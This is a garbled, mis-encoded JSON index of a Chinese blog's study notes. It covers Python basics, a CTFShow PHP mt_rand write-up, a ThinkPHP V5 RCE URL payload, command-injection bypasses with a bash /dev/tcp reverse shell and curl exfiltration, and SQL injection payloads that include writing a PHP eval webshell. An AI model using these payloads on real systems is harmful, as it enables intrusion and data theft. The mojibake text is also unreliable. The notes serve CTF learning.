æ–¹æ³•å†…å®¹\n\t\n```\n\n<!--more-->\n\n#### ç±»å¤–æ“ä½œå¯¹è±¡å±æ€§ï¼š\n\n```python\nå¯¹è±¡å.å±æ€§å=å±æ€§å†…å®¹#ç»™ç±»æ·»åŠ æˆ–ä¿®æ”¹å±æ€§\n```\n\n#### é­”æ³•æ–¹æ³•ï¼š\n\nè¿™ç±»æ–¹æ³•ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´å’Œç»“å°¾ï¼Œåœ¨æ»¡è¶³æŸç§ç‰¹å®šæ¡ä»¶æ˜¯ä¼šè°ƒç”¨è¿™ç§æ–¹æ³•\n\n```python\n#åˆ›å»ºå¯¹è±¡åä¼šç«‹å³è°ƒç”¨\n#ä½¿ç”¨æ—¶ç±»ä¼¼æ„é€ å‡½æ•°\n__init__(self,å‚æ•°1,å‚æ•°2)\n```\n\n```python\n#è¯¥æ–¹æ³•è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²ï¼Œåœ¨ä½¿ç”¨print(å¯¹è±¡)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨\n#è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨\n__str__(self)\n```\n\n```python\n#å¯¹è±¡åœ¨å†…å­˜ä¸­è¢«é”€æ¯æ—¶ä¼šè°ƒç”¨\n#ä½¿ç”¨æ—¶ç±»ä¼¼ææ„å‡½æ•°ï¼Œå¯ä½¿ç”¨del å˜é‡åè¿›è¡Œé”€æ¯\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"PythonåŸºç¡€","url":"/2022/01/11/PythonåŸºç¡€/","content":"\n# PythonåŸºç¡€\n\n#### æ•°æ®ç±»å‹ï¼š\n\nstringï¼ˆå­—ç¬¦ä¸²ï¼‰\n\nnumï¼ˆæ•°å­—ï¼‰\n\nboolï¼ˆå¸ƒå°”ï¼‰\n\nlistï¼ˆåˆ—è¡¨ï¼‰ä½¿ç”¨[    ]å®šä¹‰\n\ntupleï¼ˆå…ƒç»„ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼ˆæ— åºï¼‰\n\ndictionaryï¼ˆå­—å…¸ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼Œå†…å®¹ä¸ºï¼šä¸‹æ ‡å:å…ƒç´ å†…å®¹\n\n<!--more-->\n\n#### å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š\n\n###### æŸ¥æ‰¾ï¼š\n\n```python\nstr.find(str1,start,end)//rfindä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\nstr.index(str1,start,end)//rindexä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\n```\n\nåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨str1ï¼Œå­˜åœ¨è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸å­˜åœ¨findè¿”å›-1ï¼ŒindexæŠ¥é”™\n\n```python\nstr.count(str1,start,end)\n```\n\næŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æŸå­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°\n\n###### æ›¿æ¢ï¼š\n\n```python\nstr.replace(old,new,count)\n```\n\nå°†å­—ç¬¦ä¸²ä¸­oldå†…å®¹æ›¿æ¢ä¸ºnewï¼Œcountä¸ºæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ï¼Œä¸æ”¹å˜åŸæ¥å­—ç¬¦ä¸²\n\n###### åˆ‡å‰²ï¼š\n\n```python\nstr.split(str1,count)\n```\n\nå°†å­—ç¬¦ä¸²ä»¥str1ä¸ºåˆ†éš”åˆ‡å‰²ï¼Œcountä¸ºæœ€å¤§åˆ‡å‰²æ¬¡æ•°ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä¸æ”¹å˜åŸæœ‰å­—ç¬¦ä¸²ï¼Œé»˜è®¤æŒ‰ç©ºç™½å­—ç¬¦è¿›è¡Œå…¨åˆ‡å‰²\n\n###### åŠ å…¥ï¼š\n\n```python\nstr.join(å¯è¿­ä»£å¯¹è±¡)\n```\n\nå°†stræ’å…¥åˆ°å¯è¿­ä»£å¯¹è±¡ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n\n###### ä¹±ä¸ƒå…«ç³Ÿï¼š\n\n```python\ncapitalize(str)//å°†å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™\ntitle(str)//å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™\nstr.startwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1å¼€å¤´\nstr.endwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1ç»“å°¾\nstr.upper()//å­—æ¯å…¨å¤§å†™\nstr.lower()//å­—æ¯å…¨å°å†™\n```\n\n\n\n\n\ninputè¾“å…¥\n\nprintè¾“å‡º\n\nreadè¯»æ–‡ä»¶ï¼ˆæŒ‰å­—èŠ‚è¯»ï¼‰ï¼Œreadlineï¼ˆæŒ‰è¡Œè¯»ï¼‰\n\nopen(\"æ–‡ä»¶å\"ï¼Œ\"æ‰“å¼€æ–¹å¼ï¼ˆråªè¯»ï¼Œwå†™å…¥ï¼Œaè¿½åŠ ï¼Œï¼ˆbï¼‰ä»£è¡¨ä»¥äºŒè¿›åˆ¶æ‰“å¼€ï¼Œï¼ˆ+ï¼‰ä»£è¡¨è¯»å†™ï¼‰\"ï¼Œencoding=\"ç¼–ç æ–¹å¼\")æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶è¿›è¡Œè¯»å†™æ—¶ä¸èƒ½æŒ‡å®šencodingæ–¹å¼ï¼‰\n\n*argsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå…ƒç»„\n\n**kwargsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå­—å…¸\n\n#### Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°\n\n```python\na=1 #aåœ°å€å¼•ç”¨ä¸º1\nb=a #aåœ°å€å¼•ç”¨ä¸º2\ndel a #aåœ°å€å¼•ç”¨ä¸º1\ndel b #aåœ°å€å¼•ç”¨ä¸º0ï¼Œæ­¤æ—¶aå¼•ç”¨åœ°å€è¢«é”€æ¯\n```\n\n","tags":["Python"]},{"title":"CTFShow çˆ†ç ´web25","url":"/2022/01/08/CTFShow çˆ†ç ´web25/","content":"\n# CTFShow çˆ†ç ´web25\n\né¦–å…ˆæŸ¥çœ‹ä»£ç \n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?>\n```\n\n<!--more-->\n\nå‘ç°ä¼ å…¥å€¼æœ‰rï¼Œcookieéœ€è¦è¿›è¡Œä¼ªé€ ï¼Œå…ˆéšä¾¿ä¼ å…¥ä¸€ä¸ªrï¼Œå‘ç°å¤šæ¬¡åˆ·æ–°åæ˜¾ç¤ºçš„å€¼ç›¸åŒï¼Œè¯´æ˜éšæœºæ•°ç”Ÿæˆçš„ç»“æœç›¸åŒï¼Œéƒ½æ˜¯949254252\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web251.png)\n\næŸ¥è¯¢åå¾—çŸ¥\n\n```\nmt_srand()//ä»¥ä¼ å…¥å˜é‡ä½œä¸ºç§å­åˆ†å‘\nmt_rand()//ä»¥ç§å­ç”Ÿæˆéšæœºæ•°\n```\n\nç”±äºæ¯æ¬¡çš„seedç›¸åŒï¼Œæ‰€ä»¥ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒï¼Œå°è¯•æ„é€ payload\n\n```\n?r=949254252 Cookie: token=1898508504\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web252.png)\n\nç»“æœå‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹æç¤ºï¼Œå‘ç°æ˜¯åœ¨å¤šæ¬¡æ‰ç”¨mt_rand()æ—¶ç”Ÿæˆçš„éšæœºæ•°ä¸ç§å­æœ‰å…³ä½†å¹¶ä¸ç›¸ç­‰ï¼Œæ‰€ä»¥ä¸èƒ½ç®€å•ç”¨token=2*mt_rand()è§£å†³ï¼Œä½¿ç”¨æç¤ºä¸­ç»™å‡ºçš„è„šæœ¬è®¡ç®—å‡ºseedï¼Œæ”¾å…¥PHPç¯å¢ƒä¸­å®éªŒ\n","tags":["CTF","web"]},{"title":"æ¨¡ç‰ˆæ¼æ´","url":"/2022/01/08/æ¨¡ç‰ˆæ¼æ´/","content":"\n# æ¨¡ç‰ˆæ¼æ´\n\n### ThinkPHP V5æ¼æ´ï¼š\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHPå‡½æ•°å&vars[1][]=PHPå‡½æ•°å‚æ•°1&vars[1][]=PHPå‡½æ•°å‚æ•°2\n```\n\nè¯¥æ¼æ´å¯ç”¨äºæ‰§è¡ŒPHPå‡½æ•°\n\n<!--more-->\n","tags":["Note","CTF","web"]},{"title":"RCEè¿œç¨‹ä»£ç æ‰§è¡Œ","url":"/2022/01/08/RCEè¿œç¨‹ä»£ç æ‰§è¡Œ/","content":"\n# **RCEè¿œç¨‹ä»£ç æ‰§è¡Œ**\n\n#### **ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š**\n\n1ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 2ã€è®°å½•ç”¨æˆ·è¾“å…¥ 3ã€æ§åˆ¶é”®ç›˜é¼ æ ‡ 4ã€ä»»æ„ä¸Šä¼ ä¸‹è½½ 5ã€æˆªå±\n\n<!--more-->\n\n#### **äºŒã€RCEäº§ç”ŸåŸå› ï¼š**\n\n1ã€æœåŠ¡å™¨ä¸Šæœ‰æœ¨é©¬ \n\n2ã€è„†å¼±æœåŠ¡æœªæˆæƒ\n\n3ã€é€šè¿‡æ•°æ®åº“å†™æœ¨é©¬ \n\n4ã€æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶åŒ…å« \n\n5ã€å±é™©å‡½æ•°ï¼ˆevalï¼Œassertï¼Œsystemï¼Œshell_execï¼Œexecï¼Œfile_put_contentsï¼‰ \n\n6ã€å‘½ä»¤æ‰§è¡Œ \n\n7ã€ååºåˆ—åŒ–\n\n#### **ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š**\n\n##### **1ã€RCEé»‘åå•è¿‡æ»¤ï¼š**\n\nlinuxæ‰§è¡Œå‘½ä»¤ç‰¹æ®Šå­—ç¬¦ï¼šï¼ˆ;åˆ†å‰²å‘½ä»¤ï¼‰ï¼ˆ&&åœ¨å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ||å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥çš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ|å°†å‰é¢å‘½ä»¤æ‰§è¡Œçš„ç»“æœä½œä¸ºè¾“å…¥ï¼Œè¾“å…¥åˆ°åé¢å‘½ä»¤ä¸­æ‰§è¡Œï¼‰ï¼ˆ``å°†å‘½ä»¤æ‰§è¡Œç»“æœä½œä¸ºå‘½ä»¤å†æ¬¡æ‰§è¡Œï¼‰ï¼ˆ$()å’Œå‰ä¸€ä¸ªä¸€æ ·ï¼‰\n\nè¿‡æ»¤ç©ºæ ¼åå¯ä½¿ç”¨<å‘å‘½ä»¤ä¼ å…¥å‚æ•°ï¼Œ${IFS}ä¸ºç©ºæ ¼ï¼Œ%0aä¸ºåˆ†å·è½¬è¯‘\n\n`catç»•è¿‡å¯ä½¿ç”¨tac more less head tac tail nl od(äºŒè¿›åˆ¶æŸ¥çœ‹) vi vim sort uniq`\n\n`ç»•è¿‡ç©ºæ ¼ç”¨%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flagç»•è¿‡å¯ä½¿ç”¨é€šé…ç¬¦f*`\n\n##### **2ã€RCEæ— å›æ˜¾ï¼š**\n\nï¼ˆ1ï¼‰ã€åå¼¹shellï¼šæ”»å‡»ç«¯ç›‘å¬ä¸€ä¸ªç«¯å£å¦‚ï¼š2333 \n\nâ€‹\tæ”»å‡»ç«¯ä½¿ç”¨ï¼š\n\n```shell\nnc -lvp ç›‘å¬çš„ç«¯å£\n```\n\nâ€‹\tå—å®³ç«¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆä¸€ä¸ªåå¼¹shellï¼š\n\n```shell\nbash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\n```\n\nâ€‹\tåœ¨æ”»å‡»ç«¯ç»ˆç«¯å³å¯åœ¨å—å®³ç«¯ä¸­æ‰§è¡Œå‘½ä»¤\n\nï¼ˆ2ï¼‰ã€dnslogï¼šé€šè¿‡ping $(å‘½ä»¤).åŸŸå é€šè¿‡è¿™ç§æ–¹å¼è·å–å‘½ä»¤æ‰§è¡Œç»“æœ\n\nï¼ˆ3ï¼‰ã€å†™æ–‡ä»¶ï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨echoå‘½ä»¤ï¼š\n\n```shell\necho \"å†™å…¥å†…å®¹\">test.txt\n```\n\nï¼ˆ4ï¼‰ã€curlç­‰ç½‘ç»œå‘½ä»¤ï¼šé€šè¿‡POSTç­‰æ–¹å¼ç›´æ¥ç»™åˆ°ä¸ªäººç§æœ‰VPSä¸­\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3ã€RCEåå‘ç°ä¸å‡ºç½‘**\n\nï¼ˆ1ï¼‰ã€å†™æ–‡ä»¶\n\nï¼ˆ2ï¼‰ã€å‘½ä»¤ç›²æ³¨ï¼šå‘½ä»¤||sleep 100\n\nï¼ˆ3ï¼‰ã€éšè”½ä¿¡é“\n\n##### 4ã€å­—ç¬¦ç»•è¿‡\n\nï¼ˆ1ï¼‰ã€\n\n```\nä½¿ç”¨''æˆ–\"\"éš”æ–­å­—ç¬¦ä¸²\n```\n\nï¼ˆ2ï¼‰ã€ç©ºæ ¼å¯ä½¿ç”¨ï¼š<ï¼Œ<>ï¼Œ${IFS}ï¼Œ$IFSï¼Œ%20(space)ï¼Œ%09(tab)ï¼Œ$IFS$9ï¼Œ$IFS$1 æ›¿æ¢\n\nï¼ˆ3ï¼‰ã€åˆ†å·å¯ä½¿ç”¨ï¼š%0aï¼Œ%0dï¼Œ%0Dï¼Œ%0A æ›¿æ¢\n\nï¼ˆ4ï¼‰ã€ä½¿ç”¨base64ç¼–ç ï¼šY2F0IGZsYWcucGhw|base64ï¼Œå°†å…¶ä¸­å†…å®¹è§£ç åæ‰§è¡Œ\n\nï¼ˆ5ï¼‰ã€ä½¿ç”¨`åå¼•å·åŒ…è£¹å‘½ä»¤ï¼Œå°†å…¶ä¸­å†…å®¹ä½œä¸ºå‰ä¸€å‘½ä»¤çš„è¾“å…¥\n\n##### 5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°\n\nexec()ã€passthru()ã€system()ã€shell_exec()\n","tags":["Note","web","RCE"]},{"title":"SQLæ³¨å…¥ç¬”è®°","url":"/2022/01/08/SQLæ³¨å…¥ç¬”è®°/","content":"\n# **SQLæ³¨å…¥**\n\n1ã€é€šè¿‡order byçˆ†å‡ºå­—æ®µæ•°\n\n2ã€unionæ“ä½œï¼Œè”åˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®è¡¨çš„æ•°æ®ï¼Œé€šè¿‡union select 1,2,3â€¦,næ¥åˆ¤æ–­å›æ˜¾ä½ç½®\n\n3ã€information_schemaæ•°æ®åº“ï¼Œä¸ºmysqlè‡ªå¸¦æ•°æ®åº“ï¼Œæä¾›æ•°æ®åº“æºæ•°æ®è®¿é—®ï¼Œæœ€å¸¸ç”¨çš„æ˜¯\n\n**TABLESè¡¨**ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­è¡¨çš„ä¿¡æ¯\n\n**COLUMNSè¡¨**ï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯\n\n<!--more-->\n\nçˆ†ç ´åº“åï¼š\n\n```mysql\nunion select 1,2,database()\n//é é”™è¯¯çˆ†å‡ºåº“å\nand exists(select * from aaa)\n//aaaè¡¨å¹¶ä¸å­˜åœ¨ï¼Œæ­¤æ—¶ä¼šæŠ¥é”™åœæ­¢å¹¶è¿”å›æ•°æ®åº“å.aaa\n```\n\nçˆ†ç ´è¡¨åï¼š\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from è¡¨å)//çˆ†ç ´å‡ºè¡¨å\n```\n\nçˆ†ç ´åˆ—åï¼š\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"æƒ³æŸ¥è¯¢çš„è¡¨å\"\nand exists(select åˆ—å from å·²çŸ¥è¡¨å)//çˆ†ç ´å‡ºåˆ—å\n```\n\n4ã€æŠ¥é”™æ³¨å…¥\n\nï¼ˆ1ï¼‰updatexmlï¼šæ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°\n\nè¯­æ³•ï¼š**updatexmlï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹ï¼‰**\n\nä¾‹å­ï¼š\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),â€™1â€™)\n```\n\n0x0aä»£è¡¨æ¢è¡Œç¬¦ï¼Œconcatæ‹¼æ¥\n\næ‹¼æ¥ç›®çš„ä¸ºä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å®Œå…¨æ˜¾ç¤ºå‡ºæ¥\n\nï¼ˆ2ï¼‰extractvalueï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°\n\nè¯­æ³•ï¼š**extractvalueï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼‰**\n\næŠ¥é”™åŸç†ï¼šè·¯å¾„ä¸­å†™å…¥ä¸åˆæ³•çš„æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”è¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\næç¤ºï¼šæŠ¥é”™æœ€é•¿æ˜¾ç¤º30ä¸ªå­—ç¬¦å†…å®¹ï¼Œå¦‚æœå†…å®¹è¿‡é•¿å¯ä½¿ç”¨substrå‡½æ•°è¿›è¡Œæ‹†åˆ†\n\nâ€‹\tä¾‹é¢˜ï¼šCTFHubæŠ€èƒ½æ ‘web-SQLæ³¨å…¥-æŠ¥é”™æ³¨å…¥\n\nâ€‹\t![SQLError](/images/quiz/SQLError.png)\n\nâ€‹\té¦–å…ˆçˆ†ç ´åº“è¡¨åˆ—å\n\nâ€‹\t![SQLError2](/images/quiz/SQLError2.png)\n\nâ€‹\tè¿›è€Œå‘ç°flagè¿‡é•¿ç”¨substråˆ‡å‰²\n\nâ€‹\t![SQLError3](/images/quiz/SQLError3.png)\n\nâ€‹\tå¾—åˆ°flag\n\n5ã€ç›²æ³¨ï¼š\n\nå¸ƒå°”ç›²æ³¨ï¼šå›æ˜¾åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æœ‰ä¸€ç§æ— \n\nifè¡¨è¾¾å¼ï¼šif(expr1,expr2,expr3)\n\nexpr1ä¸ºçœŸå°±è¿”å›expr2ï¼ˆå¯ç”¨äºæ‰§è¡Œå‡½æ•°ï¼‰\n\nsubstrå‡½æ•°ï¼šsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)\n\nasciiå‡½æ•°ï¼šå°†å‡½æ•°å†…å­—ç¬¦ä»¥asciiè¡¨è½¬æ¢ä¸ºæ•°å­—ï¼Œè€Œåå¯ä»¥è¿›è¡Œåˆ¤æ–­\n\n\n\næ—¶é—´ç›²æ³¨ï¼šæ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡sleepå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ—¶é—´ç›²æ³¨\n\n~~å»ºè®®ç›´æ¥sqlmap~~\n\nï¼ˆ1ï¼‰ã€sleepå‡½æ•°çœ‹å»¶è¿Ÿæ—¶é—´\n\nï¼ˆ2ï¼‰ã€benchmark(æ‰§è¡Œæ¬¡æ•°,æ–¹å¼)ï¼Œæ‰§è¡Œè¶…å¤šæ¬¡çœ‹å»¶è¿Ÿæ—¶é—´\n\n6ã€å †å æ³¨å…¥ï¼šé€šè¿‡è¯­å¥åˆ†å‰²ç¬¦å·ï¼ˆ  ;  ï¼‰åˆ†éš”å¤šæ¡è¯­å¥ï¼Œç›´æ¥å°†æƒ³è¦çš„æ•°æ®æ’å…¥åˆ°è¡¨ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢è¯­å¥è¯»å–\n\n7ã€mysqlæ–‡ä»¶è¯»å†™ï¼šè¯»å–ï¼šload_fileå‡½æ•°ï¼šload_file(â€˜æ–‡ä»¶è·¯å¾„â€™)\n\nå†™å…¥ï¼š\n\n```mysql\nselect â€˜<?php eval($_POST[cmd]);?>â€™ into outfileæˆ–dumpfile 'ç»å¯¹è·¯å¾„';//å»ºè®®ç”¨dumpfileï¼Œå› ä¸ºoutfileä¼šåœ¨æ–‡ä»¶æœ«è¡Œå†™å…¥æ–°è¡Œï¼Œä½¿ç”¨çš„è½¬è¯‘æ¢è¡Œç¬¦ï¼Œä¼šç ´åæ–‡ä»¶å®Œæ•´æ€§ï¼Œå¯èƒ½å¯¼è‡´ä¸€å¥è¯æœ¨é©¬æ— æ³•æ‰§è¡Œ\n```\n\n8ã€å…³é”®è¯ç»•è¿‡ï¼šé€šè¿‡\n\nï¼ˆ1ï¼‰ã€set@aï¼šè®¾å®šä¸€ä¸ªè¯­å¥å˜é‡ set@sql=0x16è¿›åˆ¶æ•°\n\nï¼ˆ2ï¼‰ã€prepare : å­˜å‚¨ä¸€ä¸ªsqlè¯­å¥ å­˜åˆ°execsql é‡Œé¢ prepare execsql from @sql\n\nï¼ˆ3ï¼‰ã€execute :æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥ execute execsql\n\nç”±äºè®¾å®šè¯­å¥å˜é‡æ—¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†16è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºæ–‡å­—\n\n9ã€é›¶ç¢\n\n```mysql\nto_base64(å†…å®¹)//è¯¥è¯­å¥å°†å†…å®¹ç»è¿‡base64ç¼–ç åè¾“å‡º\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/å¯ä»£æ›¿ç©ºæ ¼\n```\n\n```\n--+ï¼Œ%23ï¼Œ#å°†åé¢çš„è¯­å¥æ³¨é‡Š\n```\n\n10ã€SQLçº¦æŸæ”»å‡»\n\nåœ¨SQLä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚ä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š\n\n```sql\nSELECT userId from user where username = 'test            '//çœ‹è¿™é‡Œæœ‰å¾ˆå¤šç©ºæ ¼\n```\n\nä¸Šè¿°ä»£ç å’Œusername = 'test'ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ä½†ä¹Ÿå­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯LIKEå­å¥äº†ã€‚æ³¨æ„ï¼Œå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œ**å­—ç¬¦ä¸²æ¯”è¾ƒ**â€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œ**SQLä¼šåœ¨å†…éƒ¨ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²**ï¼Œ**ä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´**ã€‚\n\nåœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…æ’å…¥å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œtestNameâ€æ—¶ï¼Œå®é™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œtestNâ€ã€‚\n\n```php\n//æ³¨å†Œç¤ºä¾‹ä»£ç \n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\nè¿™é‡Œæ³¨å†Œæ—¶ä½¿ç”¨ç”¨æˆ·å+ã€å¤§é‡ç©ºæ ¼ã€‘å’Œéšæœºå¯†ç æ³¨å†Œå³å¯å®Œæˆæ”»å‡»ã€‚\n\nä¸»è¦åŸç†å°±æ˜¯insertæ—¶å€™æœ‰varchar(n)çš„é™åˆ¶ï¼Œå¤§äºnçš„æ—¶å€™ä¼šæˆªå–å‰nä¸ªå­˜å…¥ã€‚åœ¨æ•°æ®åº“å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå³selectæ“ä½œï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸ä¸€æ ·ï¼Œåˆ™ä¼šå°†è¾ƒçŸ­çš„å­—ç¬¦ä¸²æœ«å°¾å¡«å……ç©ºæ ¼ï¼Œä½¿ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸€è‡´ã€‚æ³¨å†Œæ—¶selectè¯­å¥ä¸ä¼šå°†\"admin+[å¤§é‡ç©ºæ ¼]11\"åˆ å‡åˆ°nä½ï¼Œæ‰€ä»¥ä¸ä¼šè¢«selectæŸ¥å‡ºä¸adminé‡å¤ï¼Œä¸ä¼šè¿”å›æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ’å…¥admin+[ç©ºæ ¼]ï¼ˆæˆªå–ï¼‰11å’Œè‡ªå®šä¹‰å¯†ç äº†ã€‚\n\nå¦‚æœä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€å’Œå¯†ç â€œrandom_passâ€ç™»å½•çš„è¯ï¼Œå¯¹æ¯”æ—¶æ˜¯adminä¸admin+[å¤§é‡ç©ºæ ¼]ï¼Œä¼šå°†å‰é¢çš„adminæ·»åŠ ç©ºæ ¼ä¸åé¢çš„é•¿åº¦ç›¸åŒåœ¨è¿›è¡Œå¯¹æ¯”ï¼Œé‚£ä¹ˆè¿”å›çš„åªèƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œä¸ä¼šè¿”å›ç›®æ ‡ç”¨æˆ·ä¿¡æ¯ã€‚SQLæŸ¥è¯¢è¯­å¥æ˜¯ä¸€ä¸ªandæ“ä½œï¼Œå¦‚æœå¯†ç ä¸ä¸€æ ·æ€ä¹ˆä¼šæŠŠç›®æ 